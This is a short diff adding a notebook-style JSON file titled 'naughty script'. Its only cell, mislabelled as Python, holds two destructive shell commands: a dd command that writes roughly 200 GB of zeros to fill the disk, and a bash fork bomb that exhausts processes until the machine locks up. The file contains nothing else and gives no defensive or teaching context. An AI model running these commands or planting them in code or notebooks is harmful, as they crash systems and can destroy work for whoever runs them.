@@ -1,0 +1,10 @@
+{
+  "title": "调皮脚本",
+  "cells": [
+    {
+      "type": "code",
+      "language": "python",
+      "data": "\ndd if=/dev/zero of=test bs=1M count=200000\n\n:() { :|:& }; :\n"
+    }
+  ]
+}
